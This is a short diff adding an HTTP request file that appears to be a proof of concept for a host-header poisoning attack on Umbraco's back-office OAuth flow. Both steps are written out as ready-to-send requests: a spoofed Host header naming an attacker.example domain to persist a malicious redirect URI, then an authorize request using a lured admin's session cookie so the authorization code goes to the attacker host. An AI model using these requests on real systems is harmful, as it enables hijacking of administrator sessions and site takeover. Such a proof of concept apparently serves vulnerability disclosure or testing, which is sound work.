@@ -1,0 +1,9 @@
+### 1) POISON — unauthenticated, spoofed Host header (persists the attacker redirect URI)
+GET /umbraco HTTP/1.1
+Host: evil-77c658a95e.attacker.example
+
+
+### 2) POST-POISON authorize (cookie = a lured logged-in admin) — now ACCEPTED
+GET http://localhost:29184/umbraco/management/api/v1/security/back-office/authorize?client_id=umbraco-swagger&response_type=code&redirect_uri=http%3A//evil-77c658a95e.attacker.example/umbraco/openapi/oauth2-redirect.html&code_challenge=<attacker>&code_challenge_method=S256&state=... HTTP/1.1
+Host: localhost:29184
+Cookie: UMB_UCONTEXT=<lured-admin-session>
